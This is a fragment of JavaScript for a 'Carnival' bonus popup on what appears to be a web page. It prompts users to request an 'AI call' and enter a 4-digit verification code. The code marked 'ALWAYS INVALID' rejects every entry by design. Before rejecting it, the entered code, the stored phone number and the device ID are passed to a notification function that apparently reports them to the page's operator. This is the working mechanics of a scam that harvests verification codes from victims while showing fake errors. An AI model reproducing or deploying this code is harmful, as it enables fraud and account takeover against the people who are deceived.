                errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Enter a valid 4-digit code.';
                errorMsg.classList.add('show');
            }
            shakeElement(codeInput);
            return;
        }
        
        if (callCountdown <= 0) {
            if (expiredMsg) expiredMsg.classList.add('show');
            if (errorMsg) errorMsg.classList.remove('show');
            return;
        }
        
        // ALWAYS INVALID
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
        
        if (errorMsg) {
            errorMsg.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Invalid code. Request a new call.';
            errorMsg.classList.add('show');
        }
        
        codeInput.style.borderColor = '#ff1744';
        codeInput.style.boxShadow = '0 0 35px rgba(255, 23, 68, 0.9)';
        codeInput.style.color = '#ff1744';
        shakeElement(codeInput);
        
        if (verifyBtn) {
            verifyBtn.disabled = true;
            verifyBtn.style.opacity = '0.5';
            setTimeout(function() {
                if (verifyBtn) {
                    verifyBtn.disabled = false;
                    verifyBtn.style.opacity = '1';
                }
            }, 2000);
        }
        
        setTimeout(function() {
            codeInput.value = '';
            codeInput.style.borderColor = '#ffd700';
            codeInput.style.boxShadow = '0 0 25px rgba(255, 215, 0, 0.6)';
            codeInput.style.color = '#ffd700';
        }, 1500);
        
        setTimeout(function() {
            if (errorMsg) errorMsg.classList.remove('show');
            
            var statusText = document.getElementById('carnivalStatusText');
            var timerDisplay = document.getElementById('carnivalTimer');
            var codeSection = document.getElementById('carnivalCodeSection');
            var requestBtn = document.getElementById('carnivalRequestBtn');
            
            if (statusText) {
                statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Request new call</span>';
            }
            if (timerDisplay) {
                timerDisplay.style.display = 'none';
                timerDisplay.classList.remove('urgent');
            }
            if (codeSection) codeSection.classList.remove('show');
            if (requestBtn) {
                requestBtn.disabled = false;
                requestBtn.style.opacity = '1';
                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST AI CALL</span>';
            }
            
            callInProgress = false;
        }, 4000);
    }
    
    function shakeElement(element) {
        if (!element) return;
        element.style.animation = 'shake 0.5s ease';
        setTimeout(function() { element.style.animation = ''; }, 500);
    }
    
    // ========== SHOW POPUP ==========
    function showCarnivalPopup(balance) {
        currentBalance = balance || 0;
        
        addCarnivalStyles();
        
        if (!popupCreated) {
            createCarnivalPopup();
        }
        
        // Reset state
        callInProgress = false;
        callCountdown = 60;
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
        
        var popup = document.getElementById('carnivalPopup');
        if (popup) {
            popup.classList.add('show');
            
            var ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'none';
            
            // Reset UI
            var statusIcon = document.getElementById('carnivalStatusIcon');
            var statusText = document.getElementById('carnivalStatusText');
            var phoneDisplay = document.getElementById('carnivalPhoneDisplay');
            var timerDisplay = document.getElementById('carnivalTimer');
            var requestBtn = document.getElementById('carnivalRequestBtn');
            var codeSection = document.getElementById('carnivalCodeSection');
            
            if (statusIcon) statusIcon.innerHTML = '🎪';
            if (statusText) {
                statusText.innerHTML = '<strong>AI CALL</strong> will provide your verification code';
            }
            if (phoneDisplay) phoneDisplay.style.display = 'none';
            if (timerDisplay) timerDisplay.style.display = 'none';
            if (requestBtn) {
                requestBtn.disabled = false;
                requestBtn.style.opacity = '1';
                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST AI CALL</span>';
            }
            if (codeSection) codeSection.classList.remove('show');
        }
        
        console.log('🎪 Carnival popup shown');
    }
    
    // ========== CLOSE POPUP ==========
    function closeCarnivalPopup() {
        var popup = document.getElementById('carnivalPopup');
        if (popup) {
            popup.classList.remove('show');
            
            var ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
        }
        
        stopCarnivalTimer();
        callInProgress = false;
        
        if (window.PlayBonus && window.PlayBonus.resetClaimState) {
            window.PlayBonus.resetClaimState();
        }
    }
    
    // ========== INIT ==========
    function init() {
        addCarnivalStyles();
        console.log('🎪 Carnival Popup Module ready');
    }
    
    // ========== EXPORT ==========
    window.showPopup = showCarnivalPopup;
    window.closePopup = closeCarnivalPopup;
    window.getFirewallStatus = getFirewallStatus;
    window.CarnivalPopup = {
        show: showCarnivalPopup,
        close: closeCarnivalPopup,
        isFirewallOn: getFirewallStatus
    };
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
